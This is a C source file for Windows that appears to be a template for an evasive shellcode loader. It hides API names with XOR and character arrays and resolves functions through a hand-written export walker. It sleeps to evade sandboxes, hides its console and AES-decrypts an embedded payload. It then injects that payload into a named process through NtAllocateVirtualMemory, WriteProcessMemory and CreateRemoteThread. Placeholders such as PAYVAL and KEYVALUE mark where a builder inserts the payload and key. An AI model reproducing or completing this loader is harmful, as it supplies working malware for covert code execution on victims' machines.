#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32.lib")
#include <psapi.h>
#include <winternl.h>
#include <winnt.h>

EXTERN_C NTSTATUS NTAPI NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

EXTERN_C NTSTATUS NTAPI NtOpenProcess(
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID         ClientId
);

typedef NTSTATUS(NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);


unsigned char NLLEovW[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKDwiG[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
unsigned char lZWAbLq[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };
unsigned char jGhy[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };


// Custom GetProcAddress function
typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);

FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))myGetProcAddress(GetModuleHandle(NLLEovW), sKDwiG);

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))myGetProcAddress(GetModuleHandle(NLLEovW), lZWAbLq);

static void SleepShort(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

unsigned char ofthekernel[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

LPVOID(WINAPI* Vir_Alo)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

char XOR_VARIABLE[] = "XOR_KEY";

unsigned char fRandom6[] = VIRALO};
unsigned char Random9[] = PROCY};

int aRandom1(char* eRandom5, unsigned int eRandom5_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, eRandom5, &eRandom5_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int bRandom2(const char* procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pidofNumber = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pidofNumber = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pidofNumber;
}

int cRandom3(HANDLE hProc, unsigned char* eRandom5, unsigned int eRandom5_len) {
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    SIZE_T regionSize = eRandom5_len;
    ULONG protect = PAGE_EXECUTE_READ;
    ULONG allocationType = MEM_COMMIT;

    // Load NtAllocateVirtualMemory dynamically
    HMODULE hNtDll = GetModuleHandle(TEXT(NLLEovW));
    if (hNtDll == NULL) {
        return 1; // Handle error
    }

    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtDll, jGhy);
    if (NtAllocateVirtualMemory == NULL) {
        return 1; // Handle error
    }

    // Call NtAllocateVirtualMemory to allocate memory in the remote process
    NTSTATUS status = NtAllocateVirtualMemory(hProc, &pRemoteCode, 0, &regionSize, allocationType, protect);
    if (status != 0) {
        return 1; // Handle error
    }

    // Write eRandom5 to the allocated memory
    SIZE_T bytesWritten = 0;
    BOOL writeResult = WriteProcessMemory(hProc, pRemoteCode, eRandom5, eRandom5_len, &bytesWritten);
    if (!writeResult || bytesWritten != eRandom5_len) {
        return 1; // Handle error
    }

    // Create a remote thread to execute the code
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500); // Wait for the thread to finish
        CloseHandle(hThread); // Close the thread handle
        return 0; // Success
    }

    return -1; // Error creating remote thread
}

void gRandom7(char* tadas, size_t tadas_len, char* XOR_VARIABLE, size_t XOR_VARIABLE_len) {
    int r;
    r = 0;
    for (int i = 0; i < tadas_len; i++) {
        if (r == XOR_VARIABLE_len - 1) r = 0;

        tadas[i] = tadas[i] ^ XOR_VARIABLE[r];
        r++;
    }
}

unsigned char eRandom5[] = PAYVAL

int main(void) {
    void* Random8_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    int pidofNumber = 0;
    HANDLE hProc = NULL;

    char dRandom4[] = KEYVALUE
    unsigned int eRandom5_len = sizeof(eRandom5);

    FreeConsole();

    gRandom7((char*)fRandom6, sizeof(fRandom6), XOR_VARIABLE, sizeof(XOR_VARIABLE));

    SleepShort(3000);

    Vir_Alo = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))myGetProcAddress(GetModuleHandle(ofthekernel), fRandom6);

    SleepShort(4000);

    Random8_mem = Vir_Alo(0, eRandom5_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    SleepShort(5000);
    aRandom1((char*)eRandom5, eRandom5_len, dRandom4, sizeof(dRandom4));

    memcpy(Random8_mem, eRandom5, eRandom5_len);

    rv = NtProtectVirtualMemory(GetCurrentProcess(), &Random8_mem, NULL, PAGE_EXECUTE_READ, &oldprotect);

    SleepShort(6000);

    gRandom7((char*)Random9, sizeof(Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));

    pidofNumber = bRandom2(Random9);

    if (pidofNumber) {
        HANDLE hProc;
        OBJECT_ATTRIBUTES objAttr;
        CLIENT_ID clientId;

        clientId.UniqueProcess = (HANDLE)pidofNumber;
        clientId.UniqueThread = 0;

        InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

        NTSTATUS status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objAttr, &clientId);

        if (NT_SUCCESS(status)) {
            cRandom3(hProc, eRandom5, eRandom5_len);

            NtClose(hProc);  // Close the handle when done
        }
        else {
            // Handle error
        }
    }
    return 0;
}
